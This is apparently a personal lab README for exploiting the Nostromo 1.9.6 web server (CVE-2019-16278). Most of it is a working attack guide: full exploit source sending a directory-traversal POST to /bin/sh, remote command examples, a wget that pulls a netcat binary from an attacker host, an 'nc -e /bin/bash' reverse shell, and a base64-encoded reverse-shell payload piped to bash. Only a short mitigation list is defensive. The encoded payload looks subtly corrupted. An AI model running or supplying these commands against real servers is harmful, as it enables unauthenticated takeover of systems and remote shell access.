# Nostromo 1.9.6 Exploit (CVE-2019-16278)

## Overview

A **directory traversal and remote command execution (RCE)** vulnerability exists in **Nostromo HTTP Server v1.9.6**.

- **CVE ID:** CVE-2019-16278  
- **Impact:** Unauthenticated Remote Command Execution  
- **Affected Version:** Nostromo HTTP Server 1.9.6  

This vulnerability allows unauthenticated remote attackers to execute arbitrary system commands.

---

## My Web Server

https://drive.google.com/file/d/16ut2HstMu6R2q-gJMOmioF6JuV3bJPek/view?usp=drive_link

yaml
Copy code

---

## 1. CVE Information and References

- **CVE Details**  
  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16278

- **Official Nostromo Write-up**  
  http://www.nazgul.ch/dev/nostromo_cl.txt

- **Exploit-DB**  
  https://www.exploit-db.com/exploits/47837

- **GitHub â€“ Exploit Code**  
  https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py

- **Netcat Binaries**  
  https://github.com/H74N/netcat-binaries/tree/master/build

---

## 2. Exploit Setup and Editing

Open the exploit in Vim:

    vim 47837.py

Edit the exploit if required (payload tuning, port changes, compatibility fixes).

## 3. Running the Exploit

### General Syntax

    python 47837.py <target_ip> <target_port> <command>

### Execute Basic Commands
    
    python 47837.py 192.168.1.211 2222 id
    python 47837.py 192.168.1.211 2222 "uname -a"
    python 47837.py 192.168.1.211 2222 "which nc"
    python 47837.py 192.168.1.211 2222 "php -v"
    python 47837.py 192.168.1.211 2222 "which python"

## 4. Using Python 2.7 (Legacy Compatibility)
- Some targets require Python 2.7 due to syntax compatibility.

      python2.7 47837.py 192.168.1.208 2222 "which nc"
      python2.7 47837.py 192.168.1.208 2222 "whereis nc"

- Search for Writable Directories

      python2.7 47837.py 192.168.1.208 2222 "find / -writable"

- Common Writable Locations

      /tmp
      /dev/shm
      /var/tmp

- Create Test Files

      python2.7 47837.py 192.168.1.211 2222 "ls -lh /tmp/"
      python2.7 47837.py 192.168.1.211 2222 "touch /tmp/test.txt"
      python2.7 47837.py 192.168.1.211 2222 "touch /dev/shm/test.txt"

## 5. Reverse Shell Techniques
- Upload Netcat Binary

      python2.7 47837.py 192.168.1.211 2222 "wget http://192.168.1.7/nc64 -O /tmp/nc64"
      python2.7 47837.py 192.168.1.211 2222 "chmod +x /tmp/nc64"

- Launch Netcat Reverse Shell

      python2.7 47837.py 192.168.1.211 2222 "/tmp/nc64 -e /bin/bash 192.168.1.7 22"

- Listener on Attacker Machine

      nc -nlvp 22

## 6. Reverse Shell Generator
- Base64-Encoded Python Reverse Shell
    
      python2.7 47837.py 192.168.1.233 2222 \
      "echo cHlvbiAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMS43Iiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtzdWJwcm9jZXNzLmNhbGwoWyIvYmluL2Jhc2giLCItaSJdKSc= | base64 -d | bash"
- Listener

      nc -nlvp 443

## 7. Hosting Payloads via HTTP
- Python 2

      python2.7 -m SimpleHTTPServer 80

- Python 3

      python3 -m http.server 80

## 8. Exploit Source Code (Original)

    #!/usr/bin/env python
    import sys
    import socket
    
    help_menu = "Usage: cve2019-16278.py <Target_IP> <Target_Port> <Command>"
    
    def connect(soc):
        data = b""
        try:
            while True:
                chunk = soc.recv(1024)
                if not chunk:
                    break
                data += chunk
        except:
            pass
        return data
    
    def exploit(target, port, cmd):
        s = socket.socket()
        s.connect((target, int(port)))
    
        payload = (
            "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
            "Content-Length: 1\r\n\r\n"
            "echo\necho\n{} 2>&1"
        ).format(cmd)
    
        s.send(payload.encode())
        print(connect(s).decode(errors="ignore"))
    
    if __name__ == "__main__":
        try:
            exploit(sys.argv[1], sys.argv[2], sys.argv[3])
        except:
            print(help_menu)

## 9. Command Explanation
    Command	                    Description
    python2.7	                  Runs exploit with Python 2.7
    nc	                        Netcat reverse shell utility
    touch	                      Creates empty files
    find / -writable	          Finds writable directories
    base64 -d	                  Decodes base64 payload
    bash	                      Executes shell
    SimpleHTTPServer	          Python 2 HTTP server
    http.server                	Python 3 HTTP server

## 10. Mitigation

- Upgrade Nostromo to a patched version
- Restrict web access via firewall
- Apply WAF rules
- Disable unnecessary services
- Monitor logs for suspicious POST requests
